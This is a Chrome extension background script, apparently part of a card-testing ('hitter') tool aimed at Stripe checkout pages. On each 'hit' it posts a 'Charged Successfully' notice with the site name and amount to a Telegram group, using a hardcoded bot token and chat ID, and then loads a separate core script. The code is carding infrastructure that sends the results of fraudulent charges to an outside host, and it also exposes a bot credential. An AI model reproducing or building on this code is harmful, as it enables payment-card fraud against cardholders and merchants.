/**
 * Nexvora Invincible Bridge (v11.0 - Clean Sweep)
 * Total scope isolation to eliminate service worker crashes.
 */

(function() {
    // 1. Absolutely Unique Scope Variables
    const _NEX_V11_TOKEN_ = '8611283068:AAHACBysrkkm8RqmsidZ24QRwAIcnld4t8o';
    const _NEX_V11_GROUP_ = '-1003721268860';

    chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
        if (request.type === 'NOTIFY_HIT') {
            const { card, amount, gateway, status, site_name } = request.data;
            
            (async () => {
                try {
                    const message = `<b>HIT BDT</b>\n` +
                                    `🚀 <b>HIT SUCCESSFUL</b> ⚡\n` +
                                    `👤 <b>User:</b> 🇧🇩\n` +
                                    `🆙 <b>Plan:</b> <code>SILVER</code>\n` +
                                    `↔️ <b>Gateway:</b> <code>Stripe Checkout Hitter</code>\n` +
                                    `✅ <b>Response:</b> <code>Charged Successfully</code>\n` +
                                    `🌐 <b>Site:</b> <code>${site_name || 'Unknown'}</code>\n` +
                                    `💰 <b>Amount:</b> <code>${amount || 'N/A'}</code>\n\n` +
                                    `<i>Checked by @hitinfobdrobot ✅</i>`;

                    await fetch(`https://api.telegram.org/bot${_NEX_V11_TOKEN_}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: _NEX_V11_GROUP_,
                            text: message,
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [[{ text: "🚀 Open Bot", url: "https://t.me/hitinfobdrobot" }]]
                            }
                        })
                    });
                    sendResponse({ ok: true });
                } catch (err) {
                    sendResponse({ ok: false, error: err.message });
                }
            })();
            return true; 
        }
    });
})();

// 2. Load Core Logic (This restores the Dashboard)
// Standard importScripts will run the original script in a sterile global scope.
importScripts('background_core.js');
